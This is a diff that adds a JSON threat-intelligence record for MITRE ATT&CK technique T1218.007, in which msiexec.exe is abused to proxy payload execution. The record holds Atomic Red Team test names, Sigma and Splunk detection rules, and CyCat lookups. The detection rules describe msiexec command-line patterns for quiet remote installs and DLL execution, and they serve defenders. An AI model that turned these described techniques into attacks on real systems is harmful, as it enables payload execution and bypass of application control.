@@ -1,0 +1,620 @@
+{
+    "id": "T1218.007",
+    "name": "Msiexec",
+    "description": "Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi).(Citation: Microsoft msiexec) Msiexec.exe is digitally signed by Microsoft.\nAdversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs.(Citation: LOLBAS Msiexec)(Citation: TrendMicro Msiexec Feb 2018) Since it is signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the `AlwaysInstallElevated` policy is enabled.(Citation: Microsoft AlwaysInstallElevated 2018)",
+    "platforms": "Windows",
+    "kill_chain_phases": "Defense Evasion",
+    "data_sources": "Process: Process Creation, Module: Module Load, Command: Command Execution, Network Traffic: Network Connection Creation",
+    "detection": "Use process monitoring to monitor the execution and arguments of msiexec.exe. Compare recent invocations of msiexec.exe with prior history of known good arguments and executed MSI files or DLLs to determine anomalous and potentially adversarial activity. Command arguments used before and after the invocation of msiexec.exe may also be useful in determining the origin and purpose of the MSI files or DLLs being executed.",
+    "url": "https://attack.mitre.org/techniques/T1218/007",
+    "enrichments": {
+        "attack_rule_map": [
+            {
+                "tech_id": "T1218.007",
+                "atomic_attack_guid": "44a4bedf-ffe3-452e-bee4-6925ab125662",
+                "atomic_attack_name": "Msiexec.exe - Execute Remote MSI file",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Msiexec Quiet Installation",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_msiexec_install_quiet.yml",
+                        "remote_content": "title: Msiexec Quiet Installation\nid: 79a87aa6-e4bd-42fc-a5bb-5e6fbdcd62f5\nstatus: test\ndescription: |\n    Adversaries may abuse msiexec.exe to proxy execution of malicious payloads.\n    Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi)\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.007/T1218.007.md\n    - https://twitter.com/_st0pp3r_/status/1583914244344799235\nauthor: frack113\ndate: 2022-01-16\nmodified: 2024-12-01\ntags:\n    - attack.defense-evasion\n    - attack.t1218.007\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\msiexec.exe'\n        - OriginalFileName: 'msiexec.exe'\n    selection_cli:\n        # Note that there is no space before and after the arguments because it's possible to write a commandline as such\n        # Example: msiexec -q/i [MSI Package]\n        CommandLine|contains|windash:\n            - '-i'\n            - '-package'\n            - '-a'\n            - '-j'\n    selection_quiet:\n        CommandLine|contains|windash: '-q'\n    filter_user_temp:\n        # The %temp% is a very common location for installers\n        ParentImage|startswith: 'C:\\Users\\'\n        ParentImage|contains: '\\AppData\\Local\\Temp\\'\n    filter_system_temp:\n        ParentImage|startswith: 'C:\\Windows\\Temp\\'\n    filter_ccm:\n        ParentImage: 'C:\\Windows\\CCM\\Ccm32BitLauncher.exe'\n        IntegrityLevel:\n            - 'System'\n            - 'S-1-16-16384'\n    condition: all of selection_* and not 1 of filter_*\nfalsepositives:\n    - WindowsApps installing updates via the quiet flag\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "Suspicious Msiexec Quiet Install From Remote Location",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_msiexec_install_remote.yml",
+                        "remote_content": "title: Suspicious Msiexec Quiet Install From Remote Location\nid: 8150732a-0c9d-4a99-82b9-9efb9b90c40c\nrelated:\n    - id: f7b5f842-a6af-4da5-9e95-e32478f3cd2f\n      type: similar\nstatus: test\ndescription: Detects usage of Msiexec.exe to install packages hosted remotely quietly\nreferences:\n    - https://www.microsoft.com/en-us/security/blog/2022/10/27/raspberry-robin-worm-part-of-larger-ecosystem-facilitating-pre-ransomware-activity/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-10-28\nmodified: 2024-03-13\ntags:\n    - attack.defense-evasion\n    - attack.t1218.007\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\msiexec.exe'\n        - OriginalFileName: 'msiexec.exe'\n    selection_cli:\n        # Note that there is no space before and after the arguments because it's possible to write a commandline as such\n        # Example: msiexec -q/i [MSI Package]\n        CommandLine|contains|windash:\n            - '-i'\n            - '-package'\n            - '-a'\n            - '-j'\n    selection_quiet:\n        CommandLine|contains|windash: '-q'\n    selection_remote:\n        CommandLine|contains:\n            - 'http'\n            - '\\\\\\\\'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Windows MSIExec Remote Download",
+                        "rule_link": "https://research.splunk.com/endpoint/6aa49ff2-3c92-4586-83e0-d83eb693dfda/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1218.007",
+                "atomic_attack_guid": "ab09ec85-4955-4f9c-b8e0-6851baf4d47f",
+                "atomic_attack_name": "Msiexec.exe - Execute the DllUnregisterServer function of a DLL",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "DllUnregisterServer Function Call Via Msiexec.EXE",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_msiexec_dll.yml",
+                        "remote_content": "title: DllUnregisterServer Function Call Via Msiexec.EXE\nid: 84f52741-8834-4a8c-a413-2eb2269aa6c8\nstatus: test\ndescription: Detects MsiExec loading a DLL and calling its DllUnregisterServer function\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.007/T1218.007.md\n    - https://lolbas-project.github.io/lolbas/Binaries/Msiexec/\n    - https://twitter.com/_st0pp3r_/status/1583914515996897281\nauthor: frack113\ndate: 2022-04-24\nmodified: 2024-03-13\ntags:\n    - attack.defense-evasion\n    - attack.t1218.007\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\msiexec.exe'\n        - OriginalFileName: '\\msiexec.exe'\n    selection_flag:\n        CommandLine|contains|windash: ' -z '\n    selection_dll:\n        CommandLine|contains: '.dll'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Windows MSIExec Unregister DLLRegisterServer",
+                        "rule_link": "https://research.splunk.com/endpoint/a27db3c5-1a9a-46df-a577-765d3f1a3c24/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1218.007",
+                "atomic_attack_guid": "0106ffa5-fab6-4c7d-82e3-e6b8867d5e5d",
+                "atomic_attack_name": "Msiexec.exe - Execute the DllRegisterServer function of a DLL",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Suspicious Msiexec Execute Arbitrary DLL",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_msiexec_execute_dll.yml",
+                        "remote_content": "title: Suspicious Msiexec Execute Arbitrary DLL\nid: 6f4191bb-912b-48a8-9ce7-682769541e6d\nstatus: test\ndescription: |\n    Adversaries may abuse msiexec.exe to proxy execution of malicious payloads.\n    Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi)\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.007/T1218.007.md\n    - https://twitter.com/_st0pp3r_/status/1583914515996897281\nauthor: frack113\ndate: 2022-01-16\nmodified: 2024-03-13\ntags:\n    - attack.defense-evasion\n    - attack.t1218.007\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\msiexec.exe'\n        CommandLine|contains|windash: ' -y'\n    filter_apple:\n        CommandLine|contains:\n            - '\\MsiExec.exe\" /Y \"C:\\Program Files\\Bonjour\\mdnsNSP.dll'\n            - '\\MsiExec.exe\" /Y \"C:\\Program Files (x86)\\Bonjour\\mdnsNSP.dll'\n            - '\\MsiExec.exe\" /Y \"C:\\Program Files (x86)\\Apple Software Update\\ScriptingObjectModel.dll'\n            - '\\MsiExec.exe\" /Y \"C:\\Program Files (x86)\\Apple Software Update\\SoftwareUpdateAdmin.dll'\n            - '\\MsiExec.exe\" /Y \"C:\\Windows\\CCM\\'\n            - '\\MsiExec.exe\" /Y C:\\Windows\\CCM\\' # also need non-quoted execution\n            - '\\MsiExec.exe\" -Y \"C:\\Program Files\\Bonjour\\mdnsNSP.dll'\n            - '\\MsiExec.exe\" -Y \"C:\\Program Files (x86)\\Bonjour\\mdnsNSP.dll'\n            - '\\MsiExec.exe\" -Y \"C:\\Program Files (x86)\\Apple Software Update\\ScriptingObjectModel.dll'\n            - '\\MsiExec.exe\" -Y \"C:\\Program Files (x86)\\Apple Software Update\\SoftwareUpdateAdmin.dll'\n            - '\\MsiExec.exe\" -Y \"C:\\Windows\\CCM\\'\n            - '\\MsiExec.exe\" -Y C:\\Windows\\CCM\\' # also need non-quoted execution\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - Legitimate script\nlevel: medium\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Windows MSIExec DLLRegisterServer",
+                        "rule_link": "https://research.splunk.com/endpoint/fdb59aef-d88f-4909-8369-ec2afbd2c398/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1218.007",
+                "atomic_attack_guid": "ed3fa08a-ca18-4009-973e-03d13014d0e8",
+                "atomic_attack_name": "Msiexec.exe - Execute Local MSI file with an embedded EXE",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Msiexec Quiet Installation",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_msiexec_install_quiet.yml",
+                        "remote_content": "title: Msiexec Quiet Installation\nid: 79a87aa6-e4bd-42fc-a5bb-5e6fbdcd62f5\nstatus: test\ndescription: |\n    Adversaries may abuse msiexec.exe to proxy execution of malicious payloads.\n    Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi)\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.007/T1218.007.md\n    - https://twitter.com/_st0pp3r_/status/1583914244344799235\nauthor: frack113\ndate: 2022-01-16\nmodified: 2024-12-01\ntags:\n    - attack.defense-evasion\n    - attack.t1218.007\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\msiexec.exe'\n        - OriginalFileName: 'msiexec.exe'\n    selection_cli:\n        # Note that there is no space before and after the arguments because it's possible to write a commandline as such\n        # Example: msiexec -q/i [MSI Package]\n        CommandLine|contains|windash:\n            - '-i'\n            - '-package'\n            - '-a'\n            - '-j'\n    selection_quiet:\n        CommandLine|contains|windash: '-q'\n    filter_user_temp:\n        # The %temp% is a very common location for installers\n        ParentImage|startswith: 'C:\\Users\\'\n        ParentImage|contains: '\\AppData\\Local\\Temp\\'\n    filter_system_temp:\n        ParentImage|startswith: 'C:\\Windows\\Temp\\'\n    filter_ccm:\n        ParentImage: 'C:\\Windows\\CCM\\Ccm32BitLauncher.exe'\n        IntegrityLevel:\n            - 'System'\n            - 'S-1-16-16384'\n    condition: all of selection_* and not 1 of filter_*\nfalsepositives:\n    - WindowsApps installing updates via the quiet flag\nlevel: medium\n"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1218.007",
+                "atomic_attack_guid": "628fa796-76c5-44c3-93aa-b9d8214fd568",
+                "atomic_attack_name": "Msiexec.exe - Execute Local MSI file with an embedded DLL",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Msiexec Quiet Installation",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_msiexec_install_quiet.yml",
+                        "remote_content": "title: Msiexec Quiet Installation\nid: 79a87aa6-e4bd-42fc-a5bb-5e6fbdcd62f5\nstatus: test\ndescription: |\n    Adversaries may abuse msiexec.exe to proxy execution of malicious payloads.\n    Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi)\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.007/T1218.007.md\n    - https://twitter.com/_st0pp3r_/status/1583914244344799235\nauthor: frack113\ndate: 2022-01-16\nmodified: 2024-12-01\ntags:\n    - attack.defense-evasion\n    - attack.t1218.007\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\msiexec.exe'\n        - OriginalFileName: 'msiexec.exe'\n    selection_cli:\n        # Note that there is no space before and after the arguments because it's possible to write a commandline as such\n        # Example: msiexec -q/i [MSI Package]\n        CommandLine|contains|windash:\n            - '-i'\n            - '-package'\n            - '-a'\n            - '-j'\n    selection_quiet:\n        CommandLine|contains|windash: '-q'\n    filter_user_temp:\n        # The %temp% is a very common location for installers\n        ParentImage|startswith: 'C:\\Users\\'\n        ParentImage|contains: '\\AppData\\Local\\Temp\\'\n    filter_system_temp:\n        ParentImage|startswith: 'C:\\Windows\\Temp\\'\n    filter_ccm:\n        ParentImage: 'C:\\Windows\\CCM\\Ccm32BitLauncher.exe'\n        IntegrityLevel:\n            - 'System'\n            - 'S-1-16-16384'\n    condition: all of selection_* and not 1 of filter_*\nfalsepositives:\n    - WindowsApps installing updates via the quiet flag\nlevel: medium\n"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1218.007",
+                "atomic_attack_guid": "8d73c7b0-c2b1-4ac1-881a-4aa644f76064",
+                "atomic_attack_name": "Msiexec.exe - Execute Local MSI file with embedded VBScript",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Msiexec Quiet Installation",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_msiexec_install_quiet.yml",
+                        "remote_content": "title: Msiexec Quiet Installation\nid: 79a87aa6-e4bd-42fc-a5bb-5e6fbdcd62f5\nstatus: test\ndescription: |\n    Adversaries may abuse msiexec.exe to proxy execution of malicious payloads.\n    Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi)\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.007/T1218.007.md\n    - https://twitter.com/_st0pp3r_/status/1583914244344799235\nauthor: frack113\ndate: 2022-01-16\nmodified: 2024-12-01\ntags:\n    - attack.defense-evasion\n    - attack.t1218.007\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\msiexec.exe'\n        - OriginalFileName: 'msiexec.exe'\n    selection_cli:\n        # Note that there is no space before and after the arguments because it's possible to write a commandline as such\n        # Example: msiexec -q/i [MSI Package]\n        CommandLine|contains|windash:\n            - '-i'\n            - '-package'\n            - '-a'\n            - '-j'\n    selection_quiet:\n        CommandLine|contains|windash: '-q'\n    filter_user_temp:\n        # The %temp% is a very common location for installers\n        ParentImage|startswith: 'C:\\Users\\'\n        ParentImage|contains: '\\AppData\\Local\\Temp\\'\n    filter_system_temp:\n        ParentImage|startswith: 'C:\\Windows\\Temp\\'\n    filter_ccm:\n        ParentImage: 'C:\\Windows\\CCM\\Ccm32BitLauncher.exe'\n        IntegrityLevel:\n            - 'System'\n            - 'S-1-16-16384'\n    condition: all of selection_* and not 1 of filter_*\nfalsepositives:\n    - WindowsApps installing updates via the quiet flag\nlevel: medium\n"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1218.007",
+                "atomic_attack_guid": "a059b6c4-e7d6-4b2e-bcd7-9b2b33191a04",
+                "atomic_attack_name": "Msiexec.exe - Execute Local MSI file with embedded JScript",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Msiexec Quiet Installation",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_msiexec_install_quiet.yml",
+                        "remote_content": "title: Msiexec Quiet Installation\nid: 79a87aa6-e4bd-42fc-a5bb-5e6fbdcd62f5\nstatus: test\ndescription: |\n    Adversaries may abuse msiexec.exe to proxy execution of malicious payloads.\n    Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi)\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.007/T1218.007.md\n    - https://twitter.com/_st0pp3r_/status/1583914244344799235\nauthor: frack113\ndate: 2022-01-16\nmodified: 2024-12-01\ntags:\n    - attack.defense-evasion\n    - attack.t1218.007\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\msiexec.exe'\n        - OriginalFileName: 'msiexec.exe'\n    selection_cli:\n        # Note that there is no space before and after the arguments because it's possible to write a commandline as such\n        # Example: msiexec -q/i [MSI Package]\n        CommandLine|contains|windash:\n            - '-i'\n            - '-package'\n            - '-a'\n            - '-j'\n    selection_quiet:\n        CommandLine|contains|windash: '-q'\n    filter_user_temp:\n        # The %temp% is a very common location for installers\n        ParentImage|startswith: 'C:\\Users\\'\n        ParentImage|contains: '\\AppData\\Local\\Temp\\'\n    filter_system_temp:\n        ParentImage|startswith: 'C:\\Windows\\Temp\\'\n    filter_ccm:\n        ParentImage: 'C:\\Windows\\CCM\\Ccm32BitLauncher.exe'\n        IntegrityLevel:\n            - 'System'\n            - 'S-1-16-16384'\n    condition: all of selection_* and not 1 of filter_*\nfalsepositives:\n    - WindowsApps installing updates via the quiet flag\nlevel: medium\n"
+                    }
+                ]
+            }
+        ],
+        "cycat": {
+            "cycat": {
+                "cycat_related_uuids": [
+                    "79a87aa6-e4bd-42fc-a5bb-5e6fbdcd62f5",
+                    "f7b5f842-a6af-4da5-9e95-e32478f3cd2f",
+                    "8e5e38e4-5350-4c0b-895a-e872ce0dd54f",
+                    "365be77f-fc0e-42ee-bac8-4faf806d9336",
+                    "8150732a-0c9d-4a99-82b9-9efb9b90c40c",
+                    "6f4191bb-912b-48a8-9ce7-682769541e6d",
+                    "84f52741-8834-4a8c-a413-2eb2269aa6c8",
+                    "91109523-17f0-4248-a800-f81d9e7c081d",
+                    "4a2a2c3e-209f-4d01-b513-4155a540b469",
+                    "5594e67a-7f92-4a04-b65d-1a42fd824a60"
+                ],
+                "lookup_results": [
+                    {
+                        "uuid": "79a87aa6-e4bd-42fc-a5bb-5e6fbdcd62f5",
+                        "lookup_data": {
+                            "description": "Adversaries may abuse msiexec.exe to proxy execution of malicious payloads.\nMsiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi)\n",
+                            "raw": "author: frack113\ndate: 2022/01/16\ndescription: 'Adversaries may abuse msiexec.exe to proxy execution of malicious payloads.\n\n  Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly\n  associated with executing installation packages (.msi)\n\n  '\ndetection:\n  condition: all of selection_* and not 1 of filter_*\n  filter_ccm:\n    IntegrityLevel: System\n    ParentImage: C:\\Windows\\CCM\\Ccm32BitLauncher.exe\n  filter_system_temp:\n    ParentImage|startswith: C:\\Windows\\Temp\\\n  filter_user_temp:\n    ParentImage|contains: \\AppData\\Local\\Temp\\\n    ParentImage|startswith: C:\\Users\\\n  selection_cli:\n    CommandLine|contains:\n    - /i\n    - -i\n    - /package\n    - -package\n    - /a\n    - -a\n    - /j\n    - -j\n  selection_img:\n  - Image|endswith: \\msiexec.exe\n  - OriginalFileName: msiexec.exe\n  selection_quiet:\n    CommandLine|contains:\n    - /q\n    - -q\nfalsepositives:\n- Legitimate script\nid: 79a87aa6-e4bd-42fc-a5bb-5e6fbdcd62f5\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/16\nreferences:\n- https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.007/T1218.007.md\n- https://twitter.com/_st0pp3r_/status/1583914244344799235\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218.007\ntitle: Suspicious Msiexec Quiet Install\n",
+                            "sigma:id": "79a87aa6-e4bd-42fc-a5bb-5e6fbdcd62f5",
+                            "title": "Suspicious Msiexec Quiet Install",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "f7b5f842-a6af-4da5-9e95-e32478f3cd2f",
+                        "lookup_data": {
+                            "description": "Detects suspicious msiexec process starts with web addresses as parameter",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2018/02/09\ndescription: Detects suspicious msiexec process starts with web addresses as parameter\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - ' msiexec'\n    - ://\nfalsepositives:\n- False positives depend on scripts and administrative tools used in the monitored\n  environment\nid: f7b5f842-a6af-4da5-9e95-e32478f3cd2f\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/01/07\nreferences:\n- https://blog.trendmicro.com/trendlabs-security-intelligence/attack-using-windows-installer-msiexec-exe-leads-lokibot/\nrelated:\n- id: 8150732a-0c9d-4a99-82b9-9efb9b90c40c\n  type: similar\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218.007\n- attack.command_and_control\n- attack.t1105\ntitle: MsiExec Web Install\n",
+                            "sigma:id": "f7b5f842-a6af-4da5-9e95-e32478f3cd2f",
+                            "title": "MsiExec Web Install",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "8e5e38e4-5350-4c0b-895a-e872ce0dd54f",
+                        "lookup_data": {
+                            "description": "Adversaries may abuse msiexec.exe to proxy execution of malicious payloads.\nMsiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi)\n",
+                            "raw": "author: frack113\ndate: 2022/01/16\ndescription: 'Adversaries may abuse msiexec.exe to proxy execution of malicious payloads.\n\n  Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly\n  associated with executing installation packages (.msi)\n\n  '\ndetection:\n  condition: selection\n  selection:\n    Image|endswith: \\msiexec.exe\n    Initiated: 'true'\nfalsepositives:\n- Legitimate msiexec over networks\nid: 8e5e38e4-5350-4c0b-895a-e872ce0dd54f\nlevel: medium\nlogsource:\n  category: network_connection\n  product: windows\nreferences:\n- https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1218.007/T1218.007.md\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1218.007\ntitle: Msiexec Initiated Connection\n",
+                            "sigma:id": "8e5e38e4-5350-4c0b-895a-e872ce0dd54f",
+                            "title": "Msiexec Initiated Connection",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "365be77f-fc0e-42ee-bac8-4faf806d9336",
+                        "lookup_data": {
+                            "mitre-attack-id": "T1218.007",
+                            "mitre-cti:description": "Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi).(Citation: Microsoft msiexec) The Msiexec.exe binary may also be digitally signed by Microsoft.\n\nAdversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs.(Citation: LOLBAS Msiexec)(Citation: TrendMicro Msiexec Feb 2018) Since it may be signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the <code>AlwaysInstallElevated</code> policy is enabled.(Citation: Microsoft AlwaysInstallElevated 2018)",
+                            "mitre-cti:name": "Msiexec",
+                            "mitre-cti:type": "attack-pattern",
+                            "raw": "{'x_mitre_platforms': ['Windows'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['Ziv Kaspersky, Cymptom', 'Alexandros Pappas'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'type': 'attack-pattern', 'id': 'attack-pattern--365be77f-fc0e-42ee-bac8-4faf806d9336', 'created': '2020-01-24T14:38:49.266Z', 'x_mitre_version': '2.0', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1218.007', 'url': 'https://attack.mitre.org/techniques/T1218/007'}, {'source_name': 'TrendMicro Msiexec Feb 2018', 'url': 'https://blog.trendmicro.com/trendlabs-security-intelligence/attack-using-windows-installer-msiexec-exe-leads-lokibot/', 'description': 'Co, M. and Sison, G. (2018, February 8). Attack Using Windows Installer msiexec.exe leads to LokiBot. Retrieved April 18, 2019.'}, {'source_name': 'LOLBAS Msiexec', 'url': 'https://lolbas-project.github.io/lolbas/Binaries/Msiexec/', 'description': 'LOLBAS. (n.d.). Msiexec.exe. Retrieved April 18, 2019.'}, {'source_name': 'Microsoft msiexec', 'url': 'https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec', 'description': 'Microsoft. (2017, October 15). msiexec. Retrieved January 24, 2020.'}, {'source_name': 'Microsoft AlwaysInstallElevated 2018', 'url': 'https://docs.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated', 'description': 'Microsoft. (2018, May 31). AlwaysInstallElevated. Retrieved December 14, 2020.'}], 'x_mitre_deprecated': False, 'revoked': False, 'description': 'Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi).(Citation: Microsoft msiexec) The Msiexec.exe binary may also be digitally signed by Microsoft.\\n\\nAdversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs.(Citation: LOLBAS Msiexec)(Citation: TrendMicro Msiexec Feb 2018) Since it may be signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the <code>AlwaysInstallElevated</code> policy is enabled.(Citation: Microsoft AlwaysInstallElevated 2018)', 'modified': '2022-04-19T17:33:16.346Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'name': 'Msiexec', 'x_mitre_detection': 'Use process monitoring to monitor the execution and arguments of msiexec.exe. Compare recent invocations of msiexec.exe with prior history of known good arguments and executed MSI files or DLLs to determine anomalous and potentially adversarial activity. Command arguments used before and after the invocation of msiexec.exe may also be useful in determining the origin and purpose of the MSI files or DLLs being executed.', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}], 'x_mitre_is_subtechnique': True, 'x_mitre_data_sources': ['Module: Module Load', 'Process: Process Creation', 'Command: Command Execution', 'Network Traffic: Network Connection Creation'], 'x_mitre_defense_bypassed': ['Digital Certificate Validation', 'Application control'], 'x_mitre_attack_spec_version': '2.1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5'}",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "8150732a-0c9d-4a99-82b9-9efb9b90c40c",
+                        "lookup_data": {
+                            "description": "Detects usage of Msiexec.exe to install packages hosted remotely quietly",
+                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/10/28\ndescription: Detects usage of Msiexec.exe to install packages hosted remotely quietly\ndetection:\n  condition: all of selection_*\n  selection_cli:\n    CommandLine|contains:\n    - /i\n    - -i\n    - /package\n    - -package\n    - /a\n    - -a\n    - /j\n    - -j\n  selection_img:\n  - Image|endswith: \\msiexec.exe\n  - OriginalFileName: msiexec.exe\n  selection_quiet:\n    CommandLine|contains:\n    - /q\n    - -q\n  selection_remote:\n    CommandLine|contains:\n    - http\n    - \\\\\\\\\nfalsepositives:\n- Unknown\nid: 8150732a-0c9d-4a99-82b9-9efb9b90c40c\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://www.microsoft.com/en-us/security/blog/2022/10/27/raspberry-robin-worm-part-of-larger-ecosystem-facilitating-pre-ransomware-activity/\nrelated:\n- id: f7b5f842-a6af-4da5-9e95-e32478f3cd2f\n  type: similar\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1218.007\ntitle: Suspicious Msiexec Quiet Install From Remote Location\n",
+                            "sigma:id": "8150732a-0c9d-4a99-82b9-9efb9b90c40c",
+                            "title": "Suspicious Msiexec Quiet Install From Remote Location",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "6f4191bb-912b-48a8-9ce7-682769541e6d",
+                        "lookup_data": {
+                            "description": "Adversaries may abuse msiexec.exe to proxy execution of malicious payloads.\nMsiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi)\n",
